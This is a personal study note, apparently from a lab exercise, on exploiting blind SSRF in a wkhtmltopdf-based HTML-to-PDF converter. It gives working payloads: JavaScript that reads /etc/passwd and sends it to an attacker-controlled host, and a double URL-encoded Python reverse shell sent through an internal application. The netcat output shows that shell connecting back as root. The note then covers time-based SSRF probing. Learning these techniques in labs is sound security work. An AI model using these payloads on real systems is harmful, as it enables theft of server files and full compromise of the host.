---
id: 2_SSRF
created_date: 05/01/2023
updated_date: 05/01/2023
type: note
---

#  2_SSRF BLIND EXAMPLE
- **🏷️Tags** :  #01-2023 #bash #SSRF #web #javascript #blind #reverse_shell #payloads 

## 📝 Notes

on this example we have a Website where you can upload an html file and it convert it on a PDF format.

We can relate with BurpSuite with each request we are making we are getting the same response.  This is not meaning that the web site is not vulnerable to SSRF. 

we can try to upload an html file that look like this
```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```

we are receiving a response on the netcat listener, By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse [wkhtmltopdf's downloads webpage](https://wkhtmltopdf.org/downloads.html), the below statement catches our attention:

**Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.**

Great, we can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document.

Code: html

```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

The `onload` event is triggered when the `readfile` request is successful and the response is received from the server. The event handler function is defined as an anonymous function that is assigned to the `onload` property of the `readfile` object.

The function begins by checking the `readyState` property of the `readfile` object. If the `readyState` is equal to 4, it means that the request has completed and the response is ready to be processed.

Inside the `if` statement, the function constructs a new URL using the `SERVICE IP` and `PORT` placeholders, which should be replaced with the IP address and port of the remote server. The `btoa` function is used to encode the contents of the local file (which are stored in the `response` property of the `readfile` object) as ASCII text. The encoded text is appended to the URL as a query parameter named `data`.

Finally, the function uses the `exfil` `XMLHttpRequest` object to send an HTTP GET request to the constructed URL. This causes the contents of the local file to be sent to the remote server as a query parameter in the request.

Overall, this code is responsible for sending the contents of the local file to the remote server as part of the SSRF attack. It does this by constructing a URL with the encoded contents of the file as a query parameter, and sending an HTTP GET request to the URL using the `exfil` `XMLHttpRequest` object.

the port 9090 is recommended.

### Bash reverse shell with python 

In the previous section, we exploited an internal application through SSRF and executed remote commands on the target server. The same internal application (`internal.app.local`) exists in the current scenario. Let us compromise the underlying server, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.

We will use the following reverse shell payload (it is pretty easy to identify that Python is installed once you achieve remote code execution).

#### Bash Reverse Shell

```bash
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Remember, we need to URL encode our payload. In this case, we need to encode it twice. The end result will be similar to the below.

#### URL Encoded Payload

Code: html

```html
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```

#### HTML Payload
the html payload will look like this : 
```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

Launch a netcat listener and upload the html file
```bash
nc -nvlp 9090

listening on [any] 9090 ...
Connection received on 10.129.201.238 33100

# whoami

whoami
root
```

In the Exercise we are building the html file with the one line payload in python ( be careful to encode it twice ), launch a netcat listener on the port 9090 ( same as the payload one liner) and upload the file on the web site. Magic you now have reverse shell. For completing the exercise juste submit the kernel release number 
```bash
uname -r
``` 


# Time-Based SSRF 

We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services.

Let us submit the following document to the PDF application of the previous section and observe the response time.

Code: html

```html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```

![image](https://academy.hackthebox.com/storage/modules/145/img/blind_time.png)

We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that `internal.app.local` was a valid internal application (that we could access through SSRF in the previous section).

![image](https://academy.hackthebox.com/storage/modules/145/img/blind_time2.png)

In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.
## Questions/Thoughts


## 🔗 Links
 